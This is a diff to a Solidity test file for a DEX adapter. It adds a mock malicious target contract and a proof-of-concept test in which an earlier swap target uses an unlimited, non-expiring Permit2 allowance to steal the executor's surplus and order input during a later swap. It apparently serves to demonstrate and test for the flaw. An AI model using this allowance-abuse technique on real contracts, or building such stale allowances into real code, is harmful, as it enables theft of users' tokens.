@@ -9,6 +9,26 @@ import {OrderLib} from "src/lib/OrderLib.sol";
 import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
 import {MockDexRouter} from "test/mocks/MockDexRouter.sol";
 import {MockPermit2} from "test/mocks/MockPermit2.sol";
+import {Executor} from "src/Executor.sol";
+
+contract Permit2Target is MockDexRouter {
+    function pull(MockPermit2 permit2, address token, address from, uint160 amount) external {
+        permit2.transferFrom(from, address(this), amount, token);
+    }
+
+    function swapThroughPreviousTarget(
+        Permit2Target previousTarget,
+        MockPermit2 permit2,
+        address tokenIn,
+        uint160 amount,
+        uint160 stolenAmount,
+        ERC20Mock tokenOut
+    ) external {
+        previousTarget.pull(permit2, tokenIn, msg.sender, stolenAmount);
+        ERC20Mock(tokenIn).transferFrom(msg.sender, address(this), amount);
+        tokenOut.mint(msg.sender, amount);
+    }
+}
 
 contract DynamicP2DexAdapterTest is BaseTest {
     DynamicP2DexAdapter public adapterUut;
@@ -49,6 +69,65 @@ contract DynamicP2DexAdapterTest is BaseTest {
         vm.expectRevert(IExchangeAdapter.InvalidTarget.selector);
         Execution memory x = executionWithTargetData(0, address(0), hex"");
         adapterUut.delegateSwap(hash, resolvedAmountOut, cosignedOrder, x);
+    }
+
+    function test_previous_target_can_steal_executor_surplus_during_later_swap() public {
+        Executor exec = new Executor(address(this), wm);
+        Permit2Target previousTarget = new Permit2Target();
+        Permit2Target currentTarget = new Permit2Target();
+        executor = address(exec);
+        inAmount = 1000 ether;
+        inMax = inAmount;
+        outAmount = inAmount;
+
+        token.mint(executor, inAmount);
+        _swapThroughExecutor(
+            exec,
+            address(previousTarget),
+            abi.encodeCall(MockDexRouter.doSwap, (address(token), inAmount, address(token2), inAmount, executor))
+        );
+        token2.transferFrom(executor, signer, outAmount);
+
+        (,, uint160 remaining, uint48 expiration) = permit2.allowance(executor, address(token), address(previousTarget));
+        assertEq(remaining, type(uint160).max);
+        assertEq(expiration, type(uint48).max);
+        assertEq(token.allowance(executor, address(previousTarget)), 0);
+        assertEq(token.allowance(executor, address(permit2)), 0);
+
+        // The executor holds surplus plus the next order's input, but ERC20 cleanup blocks an idle pull.
+        uint256 surplus = 500 ether;
+        vm.warp(block.timestamp + 1 days);
+        token.mint(executor, surplus + inAmount);
+        vm.expectRevert(
+            abi.encodeWithSignature(
+                "ERC20InsufficientAllowance(address,uint256,uint256)", address(permit2), 0, inAmount
+            )
+        );
+        previousTarget.pull(permit2, address(token), executor, uint160(inAmount));
+
+        // A different target calls the old target while the later swap reopens the ERC20 allowance.
+        _swapThroughExecutor(
+            exec,
+            address(currentTarget),
+            abi.encodeCall(
+                Permit2Target.swapThroughPreviousTarget,
+                (previousTarget, permit2, address(token), uint160(inAmount), uint160(surplus), token2)
+            )
+        );
+
+        assertEq(token.balanceOf(address(previousTarget)), inAmount + surplus);
+        assertEq(token.balanceOf(address(currentTarget)), inAmount);
+        assertEq(token.balanceOf(executor), 0);
+        assertEq(token2.balanceOf(executor), outAmount);
+        assertEq(token.allowance(executor, address(currentTarget)), 0);
+        assertEq(token.allowance(executor, address(permit2)), 0);
+    }
+
+    function _swapThroughExecutor(Executor exec, address target, bytes memory data) internal {
+        CosignedOrder memory co = order();
+        exec.reactorCallback(
+            OrderLib.hash(co.order), co.order.output.limit, co, executionWithTargetData(0, target, data)
+        );
     }
 
     function _swapThrough(address target, uint256 amount) internal {
